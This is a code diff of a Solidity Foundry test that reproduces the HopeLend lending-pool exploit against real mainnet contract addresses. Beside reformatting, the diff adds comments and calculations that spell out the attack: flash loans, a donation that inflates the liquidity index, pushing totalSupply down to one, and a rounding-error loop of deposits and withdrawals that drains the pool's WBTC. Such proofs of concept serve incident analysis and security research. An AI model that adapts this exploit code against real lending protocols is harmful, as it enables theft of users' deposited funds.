@@ -15,12 +15,7 @@ import "./interface.sol";
 // https://lunaray.medium.com/deep-dive-into-hopelend-hack-5962e8b55d3f
 
 interface IHopeLendPool {
-    function deposit(
-        address asset,
-        uint256 amount,
-        address onBehalfOf,
-        uint16 referralCode
-    ) external;
+    function deposit(address asset, uint256 amount, address onBehalfOf, uint16 referralCode) external;
 
     function flashLoan(
         address receiverAddress,
@@ -32,11 +27,7 @@ interface IHopeLendPool {
         uint16 referralCode
     ) external;
 
-    function withdraw(
-        address asset,
-        uint256 amount,
-        address to
-    ) external returns (uint256);
+    function withdraw(address asset, uint256 amount, address to) external returns (uint256);
 
     function borrow(
         address asset,
@@ -45,7 +36,6 @@ interface IHopeLendPool {
         uint16 referralCode,
         address onBehalfOf
     ) external;
-
 }
 
 contract ContractTest is Test {
@@ -57,7 +47,7 @@ contract ContractTest is Test {
     IERC20 private stHOPE = IERC20(0xF5C6d9Fc73991F687f158FE30D4A77691a9Fd4d8);
     // proxy  0xf1cd4193bbc1ad4a23e833170f49d60f3d35a621
     IAaveFlashloan AaveV3 = IAaveFlashloan(0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2);
-    
+
     // proxy  0x53fbcada1201a465740f2d64ecdf6fac425f9030
     IHopeLendPool HopeLend = IHopeLendPool(0x53FbcADa1201A465740F2d64eCdF6FAC425f9030);
 
@@ -92,37 +82,28 @@ contract ContractTest is Test {
         WBTC.approve(address(Router), type(uint256).max);
         HOPE.approve(address(UniRouter02), type(uint256).max);
         stHOPE.approve(address(UniRouter02), type(uint256).max);
-        // USDT.approve(address(Router), type(uint256).max);
         USDC.approve(address(Router), type(uint256).max);
     }
 
-
     function testAttack() public {
-
+        deal(address(this), 0);
         approveAll();
 
         address[] memory assets = new address[](1);
         assets[0] = address(WBTC);
         uint256[] memory amounts = new uint256[](1);
-        amounts[0] = 2_300 * 1e8;
+        amounts[0] = 2300 * 1e8;
         uint256[] memory modes = new uint[](1);
         modes[0] = 0;
 
-        AaveV3.flashLoan(
-            address(this),
-            assets,
-            amounts,
-            modes,
-            address(this),
-            "",
-            0
-        );
+        AaveV3.flashLoan(address(this), assets, amounts, modes, address(this), "", 0);
 
         WBTCToWETH();
         WETH.withdraw(WETH.balanceOf(address(this)));
         block.coinbase.call{value: 264 ether}("");
-    }
 
+        emit log_named_decimal_uint("Attacker ETH balance after exploit", address(this).balance, WETH.decimals());
+    }
 
     function executeOperation(
         address[] calldata asset,
@@ -131,37 +112,28 @@ contract ContractTest is Test {
         address initiator,
         bytes calldata params
     ) external returns (bool) {
-
         index++;
-        if(index == 1){
-            HopeLend.deposit(address(WBTC), 2_000 * 1e8, address(this), 0);
+        if (index == 1) {
+            HopeLend.deposit(address(WBTC), 2000 * 1e8, address(this), 0);
         }
 
-        if(index == 2) {
-            WBTC.transfer(address(hEthWBTC), 2_000 * 1e8);
-            HopeLend.withdraw(address(WBTC), 199999999999, address(this));
+        if (index == 2) {
+            WBTC.transfer(address(hEthWBTC), 2000 * 1e8); // donate 2000 WBTC as flashloan fund to inflate index
+            HopeLend.withdraw(address(WBTC), 2000 * 1e8 - 1, address(this)); // manipulate totalSupply to 1
             return true;
         }
 
-        if(msg.sender != address(HopeLend)) {
+        if (msg.sender != address(HopeLend)) {
             uint256 idx = 0;
-            for(idx=0; idx<60; idx++) {
+            for (idx = 0; idx < 60; idx++) {
                 address[] memory assets = new address[](1);
                 assets[0] = address(WBTC);
                 uint256[] memory amounts = new uint256[](1);
-                amounts[0] = 2_000 * 1e8;
+                amounts[0] = 2000 * 1e8;
                 uint256[] memory modes = new uint[](1);
                 modes[0] = 0x0;
 
-                HopeLend.flashLoan(
-                    address(this),
-                    assets,
-                    amounts,
-                    modes,
-                    address(this),
-                    "",
-                    0x0
-                );
+                HopeLend.flashLoan(address(this), assets, amounts, modes, address(this), "", 0x0);
             }
 
             uint256 WETHBalance = WETH.balanceOf(address(0x396856F04836AaEba30311E2903B43E565a4323E)); // WETH_hToken
@@ -177,11 +149,13 @@ contract ContractTest is Test {
 
             address[] memory path = new address [](2);
             (path[0], path[1]) = (address(stHOPE), address(HOPE));
-            UniRouter02.swapExactTokensForTokens(stHOPEBalance, 0, path, address(this), type(uint).max);
+            UniRouter02.swapExactTokensForTokens(stHOPEBalance, 0, path, address(this), type(uint256).max);
 
             address[] memory path1 = new address [](2);
             (path1[0], path1[1]) = (address(HOPE), address(USDT));
-            UniRouter02.swapExactTokensForTokens(HOPE.balanceOf(address(this)), 0, path1, address(this), block.timestamp + 10000);
+            UniRouter02.swapExactTokensForTokens(
+                HOPE.balanceOf(address(this)), 0, path1, address(this), block.timestamp + 10_000
+            );
 
             USDTToUSDC();
             USDCToWBTC();
@@ -191,7 +165,6 @@ contract ContractTest is Test {
         return true;
     }
 
-
     function USDTToUSDC() internal {
         address(USDT).call(abi.encodeWithSignature("approve(address,uint256)", address(Router), type(uint256).max));
         Uni_Router_V3.ExactInputSingleParams memory _Params = Uni_Router_V3.ExactInputSingleParams({
@@ -199,7 +172,7 @@ contract ContractTest is Test {
             tokenOut: address(USDC),
             fee: 500,
             recipient: address(this),
-            deadline: block.timestamp+10000,
+            deadline: block.timestamp + 10_000,
             amountIn: USDT.balanceOf(address(this)),
             amountOutMinimum: 0,
             sqrtPriceLimitX96: 0
@@ -207,14 +180,13 @@ contract ContractTest is Test {
         Router.exactInputSingle(_Params);
     }
 
-
     function USDCToWBTC() internal {
         Uni_Router_V3.ExactInputSingleParams memory _Params = Uni_Router_V3.ExactInputSingleParams({
             tokenIn: address(USDC),
             tokenOut: address(WBTC),
             fee: 500,
             recipient: address(this),
-            deadline: block.timestamp+10000,
+            deadline: block.timestamp + 10_000,
             amountIn: USDC.balanceOf(address(this)),
             amountOutMinimum: 0,
             sqrtPriceLimitX96: 0
@@ -228,7 +200,7 @@ contract ContractTest is Test {
             tokenOut: address(WETH),
             fee: 500,
             recipient: address(this),
-            deadline: block.timestamp+10000,
+            deadline: block.timestamp + 10_000,
             amountIn: WBTC.balanceOf(address(this)),
             amountOutMinimum: 0,
             sqrtPriceLimitX96: 0
@@ -237,19 +209,31 @@ contract ContractTest is Test {
     }
 
     function WithdrawAllWBTC() internal {
-        HopeLend.deposit(address(WBTC), 15120000002, address(this), 0);
-        HopeLend.withdraw(address(WBTC), 11340000000, address(this));
+        uint256 premiumPerFlashloan = 2000 * 1e8 * 9 / 10_000; // 0.09% flashlaon fee
+        premiumPerFlashloan -= (premiumPerFlashloan * 30 / 100); // 30% protocol fee
+        uint256 nextLiquidityIndex = premiumPerFlashloan * 60 + 1; // 60 times flashloan
+        uint256 depositAmount = nextLiquidityIndex; // Use a rounding error greater than 0.5 for upward rounding and less than downward rounding
+        uint256 withdrawAmount = nextLiquidityIndex * 3 / 2 - 1; // withdraw 1.5 share of asset, but only burn 1 share throungh rounding error
+        uint256 profitPerDAW = withdrawAmount - depositAmount; // profit per deposit and withdraw process
+
+        console.log("premiumPerFlashloan", premiumPerFlashloan);
+        console.log("nextLiquidityIndex", nextLiquidityIndex);
+        console.log("depositAmount", depositAmount);
+        console.log("withdrawAmount", withdrawAmount);
+        console.log("withdrawAmount/depositAmount", withdrawAmount / depositAmount);
+
+        HopeLend.deposit(address(WBTC), depositAmount * 2, address(this), 0); // mint 2 share
+        HopeLend.withdraw(address(WBTC), withdrawAmount, address(this)); // burn 1 share, withdraw 1.5 share of asset
         uint256 idx = 0;
-        for(idx=0; idx<56; idx++){
-            HopeLend.deposit(address(WBTC), 7560000001, address(this), 0);
-            HopeLend.withdraw(address(WBTC), 11340000000, address(this));
+        uint256 count = (2000 * 1e8 + depositAmount * 3 - withdrawAmount) / profitPerDAW + 1;
+        for (idx = 0; idx < count; idx++) {
+            HopeLend.deposit(address(WBTC), depositAmount, address(this), 0); // mint 1 share
+            HopeLend.withdraw(address(WBTC), withdrawAmount, address(this)); // burn 1 share, withdraw 1.5 share of asset
         }
-        HopeLend.deposit(address(WBTC), 7560000001, address(this), 0);
-        HopeLend.withdraw(address(WBTC), 10460000060, address(this));
+        HopeLend.deposit(address(WBTC), depositAmount, address(this), 0);
+        withdrawAmount = WBTC.balanceOf(address(hEthWBTC));
+        HopeLend.withdraw(address(WBTC), withdrawAmount, address(this));
     }
 
-    receive() external payable {
-
-    }
-
+    receive() external payable {}
 }
